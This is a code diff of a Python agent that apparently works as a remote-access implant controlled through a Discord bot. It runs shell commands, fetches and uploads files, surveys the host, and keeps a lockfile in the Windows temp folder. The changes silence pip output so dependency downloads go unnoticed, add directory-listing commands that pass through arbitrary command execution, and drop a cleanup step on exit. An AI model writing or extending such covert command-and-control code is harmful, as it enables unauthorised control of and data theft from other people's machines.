@@ -41,12 +41,17 @@ def ensure_wheel(package_name, import_name=None, dest=None):
             subprocess.check_call([
                 sys.executable, "-m", "pip", "install",
                 "--upgrade", "--target", str(dest_path), package_name
-            ])
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL)
         else:
             # Download wheel into current directory
             subprocess.check_call([
                 sys.executable, "-m", "pip", "download", "--dest", str(dest_path), package_name
-            ])
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+            )
 
         # Find wheel and add to sys.path
         for wheel in dest_path.glob("*.whl"):
@@ -66,15 +71,6 @@ CHECKIN_CHANNELS = set()
 LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
 JSON_FORMAT_PREFIX = "```json\n"
 BOT_LISTEN_FOR_ID = 558898662772572160
-
-"""
-TODO: Interesting stuff to add:
-- A way to load third-party python packages.
-  e.g. request from the server, and drop the wheel to disk, and then import.
-- Find a standard library way to bootstrap. Currently we require a few different 3p packages.
-- Screenshot capability?
-- Clean up the exit function
-"""
 
 try:
     intents = discord.Intents.default()
@@ -152,6 +148,10 @@ def get_local_user_accounts():
     return users
 
 def get_services():
+    """
+        Returns a service listing by using sc query.
+        Parses for service name, display name, and state.
+    """
     output = subprocess.check_output("sc query type= service state= all", shell=True, text=True)
 
     services = []
@@ -168,7 +168,6 @@ def get_services():
         elif line.startswith("DISPLAY_NAME:") and current is not None:
             current["DISPLAY_NAME"] = line.split(":", 1)[1].strip()
         elif line.startswith("STATE") and current is not None:
-            # Example line: "STATE              : 4  RUNNING"
             match = re.search(r":\s+\d+\s+(\w+)", line)
             if match:
                 current["STATE"] = match.group(1)
@@ -222,10 +221,9 @@ async def process_put_file(attachments, message_str):
 
 def resolve_path(base_cwd, dest_arg, filename):
     """
-    Return the file path where a single attachment should be saved,
-    interpreting dest_arg as either a directory or a file path.
+        Return the file path where a single attachment should be saved,
+        interpreting dest_arg as either a directory or a file path.
     """
-
     # allow quoting in path
     raw = dest_arg.strip().strip('"')
     p = Path(raw).expanduser()
@@ -249,6 +247,8 @@ def process_command(cmd_str):
     usage_string += "cd <directory>\n"
     usage_string += "exec <cmd>\n"
     usage_string += "get <file path>\n"
+    usage_string += "ls <directory>\n"
+    usage_string += "lt <directory>\n"
     usage_string += "put <file path>\n"
     usage_string += "pwd\n"
     usage_string += "survey\n"
@@ -263,7 +263,6 @@ def process_command(cmd_str):
 
     # TODO: more commands
     # Make ls / lt aliases for python dirlist
-    # Make a 'survey' option which bundles commands
     commands = {
         "exec": execute_command,
         "get": get_content,
@@ -281,6 +280,10 @@ def process_command(cmd_str):
         output = run_survey()
     elif cmd == "cd":
         output = change_directory(cmd_str)
+    elif cmd == "lt":
+        output = list_directory(cmd_str, time_sort=True)
+    elif cmd == "ls":
+        output = list_directory(cmd_str)
     elif cmd == "pwd":
         output = f"CWD: {os.getcwd()}"
     elif cmd in commands:
@@ -306,6 +309,15 @@ def change_directory(cd_str):
         result = f"Error: {e}"
 
     return result
+
+def list_directory(cmd_str, time_sort=False):
+    """
+        Wrapper for running a directory listing.
+    """
+    if time_sort:
+        return execute_command(cmd_str.replace("lt", "dir") + " /O:D")
+    else:
+        return execute_command(cmd_str.replace("ls", "dir"))
 
 def execute_command(cmd_str):
     """
@@ -372,10 +384,6 @@ def display_services(svc_state="ALL"):
     return tabulate.tabulate(table, headers=["Service Name", "Display Name", "State"], tablefmt="github")
 
 def do_exit():
-    path = Path(DEPS_LOCATION)
-    if path.exists() and path.is_dir():
-        shutil.rmtree(path)
-
     exit(0)
 
 async def send_message_wrapper(channel, output, is_file=False, prefix="```", suffix="```"):
